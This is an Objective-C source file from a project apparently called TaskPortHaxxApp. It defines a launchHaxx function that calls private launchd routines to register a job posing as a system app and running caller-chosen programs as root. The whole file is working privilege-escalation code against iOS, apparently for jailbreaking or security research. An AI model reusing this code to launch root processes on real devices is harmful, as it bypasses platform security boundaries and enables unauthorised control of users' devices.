//
//  launch.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 31/10/25.
//

@import Foundation;
#include <mach/mach.h>
#if !__has_include(<xpc/xpc.h>)
typedef id xpc_object_t;
void xpc_dictionary_set_uint64(xpc_object_t dict, const char *key, uint64_t value);
#endif

kern_return_t _launch_job_routine(int selector, xpc_object_t request, id *result);
xpc_object_t _CFXPCCreateXPCObjectFromCFObject(id object);

BOOL launchHaxx(NSArray *args) {
    NSString *bundleID = NSBundle.mainBundle.bundleIdentifier;
    NSDictionary *plist = @{
        @"ProcessType": @"SystemApp",
        @"EnableTransactions": @NO,
        @"_ManagedBy": @"com.apple.runningboard",
        @"CFBundleIdentifier": bundleID,
        @"ThrottleInterval": @(2147483647),
        @"PersonaEnterprise": @(1000),
        @"EnablePressuredExit": @NO,
        @"InitialTaskRole": @(1),
        @"UserName": @"root",
        @"ExitTimeOut": @(1),
        @"Label": [NSString stringWithFormat:@"UIKitApplication:%@[%d]",
                   bundleID, arc4random_uniform(10000)],
        @"MaterializeDatalessFiles": @YES,
        @"ProgramArguments": args,
        @"MachServices": @{},
        @"EnvironmentVariables": @{
            @"TMPDIR": @"/var/tmp",
            @"HOME": @"/var/root",
            @"CFFIXED_USER_HOME": @"/var/root"
        },
        @"_AdditionalProperties": @{}
    };
    NSDictionary *root = @{
        @"monitor": @NO,
        @"handle": @(0),
        @"type": @(7),
        @"plist": plist
    };
    
    // Convert to xpc_object_t
    xpc_object_t xpcDict = _CFXPCCreateXPCObjectFromCFObject(root);
    // For some reason _CFXPCCreateXPCObjectFromCFObject doesn't produce correct uint64, so we set them again here
    xpc_dictionary_set_uint64(xpcDict, "handle", 0);
    xpc_dictionary_set_uint64(xpcDict, "type", 7);
    
    xpc_object_t result;
    kern_return_t kr = _launch_job_routine(0x3e8, xpcDict, &result);
    printf("Launch job routine returned: %s\n", mach_error_string(kr));
    
    return kr == KERN_SUCCESS;
}
